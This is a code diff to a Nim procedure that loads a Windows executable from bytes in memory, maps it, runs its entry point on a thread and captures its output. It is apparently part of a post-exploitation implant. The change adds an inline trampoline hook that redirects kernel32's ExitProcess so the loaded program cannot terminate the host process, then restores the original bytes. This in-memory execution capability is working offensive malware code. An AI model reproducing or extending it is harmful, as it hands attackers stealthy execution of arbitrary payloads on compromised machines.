@@ -213,7 +213,33 @@ proc execPE*(pebytes: seq[byte]): string =
     discard VirtualProtect(cast[LPVOID](base + int(s.va)),
                            SIZE_T(s.rawSz), peCharsToProt(s.chars), addr old)
 
-  # ── Phase 7: Redirect stdout/stderr, run entry point ─────────────────────
+  # ── Phase 7: Inline-hook ExitProcess → ExitThread ───────────────────────
+  # msvcrt.dll's exit() calls ExitProcess through msvcrt's own IAT, bypassing
+  # the IAT patch we applied to the loaded PE.  We write a 12-byte trampoline
+  # directly at the start of kernel32.ExitProcess so every call path is caught.
+  var epBackup: array[12, byte]
+  var epAddr: int = 0
+  var epPatched = false
+  block hookEP:
+    let k32 = LoadLibraryA("kernel32.dll")
+    if k32 == 0: break hookEP
+    epAddr = cast[int](GetProcAddress(k32, "ExitProcess"))
+    if epAddr == 0: break hookEP
+    var oldProt: DWORD
+    if VirtualProtect(cast[LPVOID](epAddr), 12, PAGE_EXECUTE_READWRITE, addr oldProt) == 0:
+      break hookEP
+    copyMem(addr epBackup[0], cast[pointer](epAddr), 12)
+    # mov rax, imm64 (10 bytes) + jmp rax (2 bytes)
+    var stub: array[12, byte]
+    stub[0] = 0x48; stub[1] = 0xB8
+    let target = cast[uint64](fakeExitProcess)
+    copyMem(addr stub[2], unsafeAddr target, 8)
+    stub[10] = 0xFF; stub[11] = 0xE0
+    copyMem(cast[pointer](epAddr), addr stub[0], 12)
+    discard VirtualProtect(cast[LPVOID](epAddr), 12, oldProt, addr oldProt)
+    epPatched = true
+
+  # ── Phase 8: Redirect stdout/stderr, run entry point ─────────────────────
   var pipeRead, pipeWrite: HANDLE
   var sa: SECURITY_ATTRIBUTES
   sa.nLength = DWORD(sizeof(sa))
@@ -238,6 +264,11 @@ proc execPE*(pebytes: seq[byte]): string =
       SetStdHandle(STD_ERROR_HANDLE, oldStderr)
       discard CloseHandle(pipeWrite)
       discard CloseHandle(pipeRead)
+    if epPatched:
+      var oldProt: DWORD
+      discard VirtualProtect(cast[LPVOID](epAddr), 12, PAGE_EXECUTE_READWRITE, addr oldProt)
+      copyMem(cast[pointer](epAddr), addr epBackup[0], 12)
+      discard VirtualProtect(cast[LPVOID](epAddr), 12, oldProt, addr oldProt)
     return "[error: CreateThread failed (err " & $GetLastError() & ")]"
 
   # Wait up to 30 s for the entry point to return
@@ -249,11 +280,18 @@ proc execPE*(pebytes: seq[byte]): string =
     SetStdHandle(STD_ERROR_HANDLE, oldStderr)
     discard CloseHandle(pipeWrite)
 
+  # Restore ExitProcess to its original bytes
+  if epPatched:
+    var oldProt: DWORD
+    if VirtualProtect(cast[LPVOID](epAddr), 12, PAGE_EXECUTE_READWRITE, addr oldProt) != 0:
+      copyMem(cast[pointer](epAddr), addr epBackup[0], 12)
+      discard VirtualProtect(cast[LPVOID](epAddr), 12, oldProt, addr oldProt)
+
   if r == DWORD(0x00000102):   # WAIT_TIMEOUT
     if pipeOk: discard CloseHandle(pipeRead)
     return "[+] PE executing (async \xe2\x80\x94 entry point did not return within 30 s)"
 
-  # ── Phase 8: Collect captured output ─────────────────────────────────────
+  # ── Phase 9: Collect captured output ─────────────────────────────────────
   if not pipeOk:
     return "[+] PE executed (output not captured)"
 
